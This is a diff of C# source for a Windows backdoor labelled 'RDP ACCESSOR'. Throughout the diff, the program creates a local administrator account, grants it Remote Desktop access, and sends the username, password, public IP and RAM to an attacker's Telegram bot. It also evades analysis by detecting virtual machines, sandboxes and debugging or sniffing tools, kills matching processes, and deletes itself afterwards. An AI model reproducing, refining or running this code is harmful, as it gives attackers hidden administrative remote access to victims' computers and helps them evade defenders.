@@ -1,125 +1,114 @@
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Net;
+using System.Threading;
 
 namespace localhost
 {
     internal static class Program
     {
-        [STAThread]
+
+        private static readonly string Token = "token_bot"; // Your token bot ( @BotFather )
+        private static readonly string ID = "chatid_user"; // Your chat-id ( @getmyid_bot )
+
+        private static readonly string newUserName = "zxc_user"; // Any username ( ex. kevin )
+        private static readonly string newUserPass = "zxc_pass"; // Any password ( ex. mitnik )
+
+        private static readonly string mutex = "zxc_mutex"; // Mutex
+        private static readonly string regkey = @"SOFTWARE\mmts"; // Reg-Path to Key
+
+        
         private static void Main()
         {
-            CheckAnalysis(); // Check AnyRun or Virtual Machine 
-            CheckProcesses(); // Check forbidden processes: debuggers, network monitors and etc. . .
+            CheckAnalysis(); // Check for simple anti-vm/anyrun/debug methods.
 
             try
             {
-                createAdminUser(); // Create admin user
-                allowRemoteAccess(); // Allowed remote accesses
-                SendMessage("Job's done!"); // null function
-                autoSeflDel(); // auto-self delete function
-            }
-            catch 
-            {
-                autoSeflDel(); // Autoself delete
-                return;
-            }
+                ClientEnabler(); // Check Mutex
+                CreateTicket(); // Create-Admin User
 
-
-        }
-        private static void createAdminUser()
-        {
-            try
-            {
-                AppendToSummary("Created Admin User");
-                RunPS($"net user {newUserName} {newUserPass} /add");
-                RunPS($"net localgroup administrators {newUserName} /add");
+                AllowRem(); // Enable User to " Remote Desktop Users" Group
+                ClientMessager(); // Send data in telegram-bot
+                SelferClient(); // Auto-Self delete
             }
-            catch (Exception)
+            catch
             {
-                throw;
-            }
-        }
-        private static void allowRemoteAccess()
-        {
-            try
-            {
-                AppendToSummary("Allowed Remote Access");
-                RunPS($"net localgroup \"Remote Desktop Users\" {newUserName} /add");
-            }
-            catch (Exception)
-            {
-                throw;
+                SelferClient(); // if we failed to create admin-user in rdp, program automaticly self-delete.
             }
         }
 
-        private static void AppendToSummary(string text)
+        private static void CreateTicket() // Add admin function
         {
-            summaryMessage = summaryMessage + text + Environment.NewLine;
+            RunPS($"net user {newUserName} {newUserPass} /add");
+            RunPS($"net localgroup Administrators {newUserName} /add");
         }
 
-        private static void SendMessage(string text)
+        private static void AllowRem() // Allow remote access function
         {
-            try
+            RunPS($"net localgroup \"Remote Desktop Users\" {newUserName} /add");
+        }
+
+
+        private static void ClientMessager() // Send message in telegram function
+        {
+            string ram = GetRAM();
+            string value = $"===[ ]===[ RDP ACCESSOR V4 LOG ]===[ ]===\n[+]  Username => {newUserName}\n[+]  Password => {newUserPass}\n[+]  IP => {Get("https://api.ipify.org/")}\n[+]  RAM => {ram}\n===[ ]===[ NEW ADMIN-USER LOG ]===[ ]===";
+
+            using (WebClient webClient = new WebClient())
             {
-                string ram = GetRAM();
-                string value = string.Concat(new string[]
-                {
-                    string.Concat(new string[]
-                    {
-                        "===[ ]===[ RDP ACCESSOR V2 LOG ]===[ ]===",
-                        Environment.NewLine,
-                        summaryMessage,
-                        "[+]  Username => ",
-                        newUserName,
-                        "\n[+]  Password => ",
-                        newUserPass,
-                        "\n[+]  IP => ",
-                        Get("https://api.ipify.org/"),
-                        "\n[+]  RAM => ", ram,
-                        "\n[+]  Result => ",text,
-                        "\n===[ ]===[ NEW ADMIN-USER LOG ]===[ ]==="
-                    })
-                });
-                using (WebClient webClient = new WebClient())
-                {
-                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-                    webClient.DownloadString(string.Concat(new string[]
-                    {
-                        "https://api.telegram.org/bot",
-                        Program.Token,
-                        "/sendMessage?chat_id=",
-                        Program.ID,
-                        "&text=",
-                        WebUtility.UrlEncode(value)
-                    }));
-                }
-            }
-            catch (Exception)
-            {
-                throw;
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                webClient.DownloadString($"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={WebUtility.UrlEncode(value)}");
             }
         }
 
-        private static void CheckAnalysis()
-        {
-            if (AntiVM_Checker())
-            {
-                autoSeflDel();
-            }
 
-            if (AnyRunDtc())
+        public static void ClientEnabler() // Function for create mutex
+        {
+             // Path to key
+
+            if (ClientExist(mutex, regkey))
             {
-                autoSeflDel();
+                SelferClient();
+            }
+            CreateSolution(mutex, regkey);
+
+        }
+        private static bool ClientExist(string mutexName, string registryKeyPath) // Check mutex key
+        {
+            using (var registryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath))
+            {
+                return registryKey.GetValue(mutexName) != null;
             }
         }
 
-        // CHECK FORBIDDEN PROCESSES AND CHECKING VIRTUAL MACHINES OR ANYRUN | START
-        public static bool CheckProcesses() // Check Forbidden processes to kill
+        private static void CreateSolution(string mutexName, string registryKeyPath) // Add mutex in first start
         {
-            string[] forbiddenProcesses = {
+            Mutex mutex;
+
+            mutex = new Mutex(true, mutexName);
+
+            using (var registryKey = Registry.CurrentUser.CreateSubKey(registryKeyPath))
+            {
+                registryKey.SetValue(mutexName, 1);
+            }
+        }
+
+
+        private static void CheckAnalysis() // Simple anti-dbg/vm/anyrun methods. (SIMPLE!)
+        {
+            if (VMClient() || ClientAny())
+            {
+                SelferClient();
+            }
+            CheckClient();
+        }
+
+        public static bool CheckClient() // Detect forbidden process
+        {
+            string[] fckProcess = {
                 "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                 "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                 "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
@@ -131,9 +120,10 @@ namespace localhost
                 "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                 "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
             };
+
             var processes = Process.GetProcesses();
 
-            foreach (var processName in forbiddenProcesses)
+            foreach (var processName in fckProcess)
             {
                 foreach (var process in processes)
                 {
@@ -146,16 +136,15 @@ namespace localhost
                         }
                         catch { }
 
-
                         return true;
                     }
                 }
             }
 
             return false;
-        } // End function
+        }
 
-        private static bool AnyRunDtc() // Check AnyRun
+        private static bool ClientAny() // Detect anyrun
         {
             string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };
 
@@ -163,27 +152,21 @@ namespace localhost
             {
                 if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                 {
-                    return false; 
+                    return false;
                 }
             }
 
-            if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
-            {
-                return true;
-            }
+            return Environment.UserName.Equals("admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC");
+        }
 
-            return false;
-        } // End function
-
-        private static bool AntiVM_Checker() // Check Virtual Machine
+        private static bool VMClient() // Detect VM
         {
             string[] vmProcesses = {
-        "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
-        "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
-        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
-        "VBoxTray",
-    };
-
+                "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
+                "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
+                "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
+                "VBoxTray", "rdpclip",
+            };
             var processes = Process.GetProcesses();
 
             foreach (var process in processes)
@@ -198,12 +181,9 @@ namespace localhost
             }
 
             return false;
-        } // End Function
+        }
 
-    // END CHECKING
-        
-
-        private static void RunPS(string args)
+        private static void RunPS(string args) // Run powershell | auxiliary function
         {
             Process process = new Process
             {
@@ -219,58 +199,47 @@ namespace localhost
             process.WaitForExit();
         }
 
-        private static string GetRAM()
+        private static string GetRAM() // Get Ram
         {
             try
             {
-                int num = 0;
+                double totalPhysicalMemory = 0;
                 using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                 {
-                    using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
+                    foreach (ManagementObject managementObject in managementObjectSearcher.Get())
                     {
-                        if (enumerator.MoveNext())
-                        {
-                            ManagementObject managementObject = (ManagementObject)enumerator.Current;
-                            double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
-                            num = (int)(num2 / 1048576.0) - 1;
-                        }
+                        totalPhysicalMemory = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
                     }
                 }
-                return num.ToString("#,GB");
+                return ((int)((totalPhysicalMemory / 1048576.0) - 1)).ToString("#,GB");
             }
-            catch (Exception)
+            catch
             {
                 throw;
             }
         }
 
-        private static string Get(string uri)
+        private static string Get(string uri) // Get currently IP-Machine
         {
             using (WebClient client = new WebClient())
             {
-                string result = client.DownloadString(uri);
-                return result;
+                return client.DownloadString(uri);
             }
-            
         }
 
-
-        private static void autoSeflDel()
+        private static void SelferClient() // Self delete auxiliary function
         {
             var fileName = Process.GetCurrentProcess().MainModule.FileName;
-            selfRemove(fileName, 1);
+            SelfTicket(fileName, 1);
             Environment.Exit(0);
         }
 
-
-        private static void selfRemove(string fileName, int delaySecond = 2)
+        private static void SelfTicket(string fileName, int delaySecond = 2) // zxccxz, fck,zxc,zxcz,hahaa
         {
             fileName = Path.GetFullPath(fileName);
             var folder = Path.GetDirectoryName(fileName);
             var currentProcessFileName = Path.GetFileName(fileName);
-
             var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";
-
             var processStartInfo = new ProcessStartInfo()
             {
                 FileName = "cmd",
@@ -283,10 +252,5 @@ namespace localhost
             Process.Start(processStartInfo);
         }
 
-        public static string Token = "TOKENBOT";
-        public static string ID = "CHATIDUSER";
-        public static string newUserName = "RDPUSERNAME";
-        public static string newUserPass = "RDPPASSWORD";
-        public static string summaryMessage = "";
     }
 }
